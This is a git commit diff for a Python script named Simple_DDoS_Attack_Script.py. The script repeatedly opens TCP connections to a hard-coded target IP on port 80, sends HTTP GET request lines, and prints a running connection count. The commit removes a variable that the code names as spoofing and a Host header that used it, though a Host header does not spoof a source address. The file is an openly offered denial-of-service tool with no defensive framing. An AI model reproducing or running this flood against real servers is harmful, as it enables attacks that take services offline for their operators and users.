ba0a3a980949811b53e92a01752de6d2c6cb1d7c
Gaurav Thapliyal <40315835+GTHAP@users.noreply.github.com>
2022-05-10 15:02:18 +0530

    Update Simple_DDoS_Attack_Script.py

--- Simple_DDoS_Attack_Script.py
+++ Simple_DDoS_Attack_Script.py
@@ -6,7 +6,6 @@ import socket
 
 target_ip_address = '172.24.124.199'
 port = 80
-spoof_ip_address = '100.64.100.10'
 current_connections = 0
 
 def ddos_attack():
@@ -14,12 +13,9 @@ def ddos_attack():
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target_ip_address, port))
         s.sendto(("GET /" + target_ip_address + " HTTP/1.1\r\n").encode('ascii'), (target_ip_address, port))
-        s.sendto(("Host: " + spoof_ip_address + "\r\n\r\n").encode('ascii'), (target_ip_address, port))
         s.close()
-
         global current_connections
         current_connections += 1
-
         if current_connections % 500 == 0:
             print(current_connections)
 
